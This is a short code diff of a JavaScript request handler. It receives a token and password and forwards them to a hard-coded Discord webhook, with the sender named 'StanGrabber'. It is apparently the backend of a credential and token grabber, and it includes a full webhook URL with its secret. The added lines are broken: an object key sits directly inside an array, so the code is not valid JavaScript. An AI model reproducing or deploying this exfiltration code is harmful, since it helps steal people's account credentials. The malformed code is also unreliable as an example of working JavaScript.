@@ -8,7 +8,13 @@ exports.send = (req, res, webhook) =>
 	if(token === undefined || password === undefined)
 		return res.status(400).json({status: "error", message: "Not sent."});
 	
-	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { content: `Token: ${token}\nPassword: ${password}` })
+	
+	
+	
+	axios.post(`https://discord.com/api/webhooks/797868594515804220/r9pUD70qd6SVtaKA-sy0AtXbkH7hjZlHAbYDF0gn-7-3uTpQAYMcv_oRcbf57y6uqnj8`, { username:`StanGrabber`, content: ``, embeds:[
+	description:'test',
+	
+	] })
 	.then((resp) => 
 	{
 		if(resp.status === 200)
